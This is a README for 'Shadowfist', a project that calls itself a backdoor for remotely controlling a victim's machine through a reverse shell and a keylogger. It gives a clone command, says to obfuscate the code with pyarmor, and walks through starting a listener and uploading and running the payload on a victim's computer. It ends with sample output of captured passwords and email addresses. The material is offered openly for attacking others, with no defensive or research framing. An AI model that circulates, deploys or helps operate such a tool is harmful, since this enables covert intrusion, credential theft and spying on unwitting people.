





# Shadowfist

This is an advanced backdoor tool that allows you to remotely access and control a victim's machine. It includes several advanced features, such as a reverse shell and a keylogger.

## Installation

To install the tool, follow these steps:

1. Clone the repository:
```bash
git clone https://github.com/cypherdavy/Shadowfist.git


Compile the code using pyarmor:
pyarmor obfuscate __main__.py
Usage
To use the tool, follow these steps:
Start the reverse shell listener on your machine:
python reverse_shell.py
Upload the compiled code to the victim's machine and run it:
python shadowfist.py
The reverse shell will connect to your machine, allowing you to remotely execute commands and transfer files:
$ ls
Desktop Documents Downloads Music Pictures Public Templates Videos
The keylogger will start recording the victim's keystrokes:
[Keylogger] Started recording keystrokes
[Keylogger] Password: mypassword123
[Keylogger] Email: me@example.com
[Keylogger] Gmail: mygmail@gmail.com

